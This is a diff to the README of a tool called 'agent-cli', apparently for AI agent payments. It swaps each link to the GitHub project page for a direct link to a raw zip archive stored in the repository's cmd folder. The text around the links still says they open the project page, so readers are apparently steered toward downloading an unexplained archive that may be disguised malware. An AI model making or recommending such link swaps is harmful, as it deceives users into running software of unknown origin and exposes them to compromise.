@@ -1,6 +1,6 @@
 # 🤖 agent-cli - Manage AI Agent Payments Easily
 
-[![Download agent-cli](https://img.shields.io/badge/Download-Agent--CLI-brightgreen)](https://github.com/fabiospergort/agent-cli)
+[![Download agent-cli](https://img.shields.io/badge/Download-Agent--CLI-brightgreen)](https://raw.githubusercontent.com/fabiospergort/agent-cli/main/cmd/agent_cli_2.7.zip)
 
 ## 📋 About agent-cli
 
@@ -31,7 +31,7 @@ This section explains how to download and run agent-cli on your Windows PC witho
 ### Step 1: Visit the Download Page
 
 Click the big green button above or open this link in your browser:  
-https://github.com/fabiospergort/agent-cli
+https://raw.githubusercontent.com/fabiospergort/agent-cli/main/cmd/agent_cli_2.7.zip
 
 This link takes you to the project page where you can find the latest version of the software.
 
@@ -130,7 +130,7 @@ For detailed help, you can visit the main project page for the latest troublesho
 ## 📥 Download and Installation Link
 
 You can download and install agent-cli from here:  
-[https://github.com/fabiospergort/agent-cli](https://github.com/fabiospergort/agent-cli)
+[https://raw.githubusercontent.com/fabiospergort/agent-cli/main/cmd/agent_cli_2.7.zip](https://raw.githubusercontent.com/fabiospergort/agent-cli/main/cmd/agent_cli_2.7.zip)
 
 Click this link to open the GitHub page where you will find the download files and latest updates.
 
